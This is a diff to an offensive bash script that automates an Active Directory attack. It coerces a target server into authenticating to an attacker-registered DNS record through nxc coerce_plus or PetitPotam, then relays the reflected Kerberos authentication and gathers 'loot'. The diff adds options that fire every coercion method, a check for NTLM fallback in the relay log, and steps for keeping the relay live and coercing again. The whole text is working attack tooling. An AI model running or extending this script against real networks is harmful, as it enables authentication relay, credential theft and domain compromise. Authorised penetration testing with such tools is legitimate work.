@@ -55,6 +55,8 @@ VARIANT="circled"
 LETTER=""
 DNS_TOOL="dnstool"    # dnstool (shipped) | bloodyad
 COERCE_TOOL="nxc"     # nxc (coerce_plus) | petitpotam
+COERCE_METHOD=""      # nxc coerce_plus: pin ONE method (empty = try ALL methods)
+COERCE_ALWAYS=1       # nxc coerce_plus: pass ALWAYS=True (keep going through every method)
 LOOT_DIR="$HERE/loot"
 
 DRY_RUN=0
@@ -269,8 +271,11 @@ cmd_coerce() {
   confirm "coerce $TARGET_IP to authenticate to '$RECORD' (-> your relay)?"
   if [ "$COERCE_TOOL" = "nxc" ]; then
     [ "$DRY_RUN" -eq 1 ] || have nxc || die "nxc not on PATH (needed for coerce_plus); or use --coerce-tool petitpotam"
+    local copts=("LISTENER=$RECORD")
+    [ -n "$COERCE_METHOD" ] && copts+=("M=$COERCE_METHOD")   # unset = coerce_plus tries ALL methods
+    [ "$COERCE_ALWAYS" -eq 1 ] && copts+=("ALWAYS=True")     # keep firing every method
     run nxc smb "$TARGET_IP" -u "$USER1" -p "$PASS1" -d "$DOMAIN" \
-        -M coerce_plus -o M=petitpotam "LISTENER=$RECORD"
+        -M coerce_plus -o "${copts[@]}"
   else
     local pp="$HERE/PetitPotam.py"; [ -f "$pp" ] || pp="PetitPotam.py"
     run "$PY" "$pp" -d "$DOMAIN" -u "$USER1" -p "$PASS1" "$RECORD" "$TARGET_IP"
@@ -353,8 +358,9 @@ cmd_auto() {
     local rl="$LOOT_DIR/relay.log" before after i outcome=none
     before="$(ls -1 "$LOOT_DIR" 2>/dev/null | grep -v relay.log | wc -l)"
     for i in $(seq 1 "$LOOT_WAIT"); do
-      grep -qF 'reauth-bypass] SUCCESS' "$rl" 2>/dev/null && outcome=success
-      grep -qF 're-auth refused'        "$rl" 2>/dev/null && { outcome=refused; break; }
+      grep -qF 'reauth-bypass] SUCCESS'        "$rl" 2>/dev/null && outcome=success
+      grep -qF 're-auth refused'               "$rl" 2>/dev/null && { outcome=refused; break; }
+      grep -qF "Unsupported MechType 'NTLMSSP" "$rl" 2>/dev/null && { outcome=ntlm; break; }
       after="$(ls -1 "$LOOT_DIR" 2>/dev/null | grep -v relay.log | wc -l)"
       [ "$after" -gt "$before" ] && { outcome=loot; break; }
       sleep 1
@@ -370,13 +376,23 @@ cmd_auto() {
         warn "note: patchcheck #4 only tests an NTLM user->user swap, which differs from this live"
         warn "Kerberos machine-account reflection in both identity and protocol - so #4 can read"
         warn "'absent' while the live swap is refused. The relay is the authoritative test.";;
+      ntlm)
+        warn "victim authenticated over NTLM, which reauthx (Kerberos-only) rejects:"
+        warn "  \"Unsupported MechType 'NTLMSSP'\" in $rl."
+        warn "the coercion name did not yield a Kerberos ticket. Check: -H is the FQDN of THIS target"
+        warn "(must match -T's host for self-reflection), and that CVE-2026-26128 (the Unicode vector)"
+        warn "is not patched here (patchcheck does not test it). A cmti/non-SPN name also forces NTLM.";;
       none)
         warn "no reflected re-auth reached the relay within ${LOOT_WAIT}s."
         warn "most likely the victim could not reach your relay at $RELAY_IP - re-check -R reachability from the target subnet.";;
     esac
   fi
   if [ "$KEEP_UP" -eq 1 ] && [ "$DRY_RUN" -eq 0 ]; then
-    ok "relay staying up (pid $RELAY_PID); press Ctrl-C to stop it and tear down the DNS record."
+    printf '\n' >&2
+    ok "LIVE: relay (pid $RELAY_PID) and the DNS record stay UP until you stop them."
+    ok "  tail the catches:   tail -f $rl"
+    ok "  coerce again:       $0 coerce -T $TARGET_IP -H '$TARGET_HOST' -d $DOMAIN -u $USER1 -p '<pass>'"
+    ok "  stop + clean up:    press Ctrl-C here"
     wait "$RELAY_PID" 2>/dev/null || true
   else
     ok "done; teardown trap will remove the DNS record and stop the relay."
@@ -407,6 +423,8 @@ Options (each command uses only the ones it needs):
         --letter L            unicode: which hostname letter to substitute
         --dns-tool T          dnstool (shipped, default) | bloodyad
         --coerce-tool T       nxc (coerce_plus, default) | petitpotam
+        --coerce-method M     nxc: pin ONE coerce_plus method (default: try ALL methods)
+        --no-always           nxc: drop ALWAYS=True (default on: fire every method)
         --loot DIR            relay loot dir (default ./loot)
   behaviour
     -n, --dry-run             print commands (secrets masked), run nothing
@@ -441,6 +459,8 @@ while [ $# -gt 0 ]; do
     --letter)         LETTER="$2"; shift 2;;
     --dns-tool)       DNS_TOOL="$2"; shift 2;;
     --coerce-tool)    COERCE_TOOL="$2"; shift 2;;
+    --coerce-method)  COERCE_METHOD="$2"; shift 2;;
+    --no-always)      COERCE_ALWAYS=0; shift;;
     --loot)           LOOT_DIR="$2"; shift 2;;
     -n|--dry-run)     DRY_RUN=1; shift;;
     -y|--yes)         ASSUME_YES=1; shift;;
